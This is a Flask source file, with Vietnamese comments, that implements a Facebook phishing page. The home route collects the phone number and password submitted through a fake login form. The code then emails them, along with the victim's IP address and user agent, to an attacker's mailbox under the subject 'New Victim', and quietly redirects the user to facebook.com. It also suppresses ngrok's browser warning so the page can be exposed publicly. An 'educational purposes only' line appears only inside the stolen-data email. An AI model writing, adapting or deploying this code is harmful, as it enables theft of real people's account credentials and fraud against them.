from flask import Flask, render_template, request, url_for, redirect, make_response
from flask_mail import Mail, Message
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email_config import EMAIL_CONFIG
# from pyngrok import ngrok

app = Flask(__name__)

# Cấu hình email
app.config['MAIL_SERVER'] = EMAIL_CONFIG['MAIL_SERVER']
app.config['MAIL_PORT'] = EMAIL_CONFIG['MAIL_PORT']
app.config['MAIL_USE_TLS'] = EMAIL_CONFIG['MAIL_USE_TLS']
app.config['MAIL_USE_SSL'] = EMAIL_CONFIG['MAIL_USE_SSL']
app.config['MAIL_USERNAME'] = EMAIL_CONFIG['MAIL_USERNAME']
app.config['MAIL_PASSWORD'] = EMAIL_CONFIG['MAIL_PASSWORD']

mail = Mail(app)

# ngrok.set_auth_token("your_auth_token_here")
# public_url = ngrok.connect(5000).public_url

def send_login_info(phone_number, password):
    """Gửi thông tin đăng nhập qua email"""
    try:
        msg = Message(
            subject='Facebook Login Info - New Victim',
            sender=EMAIL_CONFIG['MAIL_USERNAME'],
            recipients=[EMAIL_CONFIG['MAIL_RECIPIENT']]
        )
        
        msg.body = f"""
        🎯 FACEBOOK PHISHING RESULT
        
        📱 Phone Number: {phone_number}
        🔑 Password: {password}
        
        ⏰ Time: {request.remote_addr}
        🌐 IP Address: {request.remote_addr}
        🖥️ User Agent: {request.headers.get('User-Agent', 'Unknown')}
        
        ⚠️ This is a phishing result for educational purposes only.
        """
        
        mail.send(msg)
        print(f"✅ Email sent successfully for {phone_number}")
        return True
        
    except Exception as e:
        print(f"❌ Error sending email: {str(e)}")
        return False

@app.after_request
def after_request(response):
    # Thêm header để bỏ qua cảnh báo ngrok
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response

@app.route("/", methods=['GET','POST'])
def home():
    if request.method == 'POST':
        name = request.form['phoneNumber']
        password = request.form['passwd']
        print(f'"{name}" is your phone number and "{password}" is your password')
        
        # Gửi thông tin qua email
        send_login_info(name, password)
        
        # Redirect trực tiếp về Facebook
        return redirect('https://facebook.com')
        
    return render_template('index.html')

# print(f"To access public url please clink on {public_url}")
# app.run(port=5000)






if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
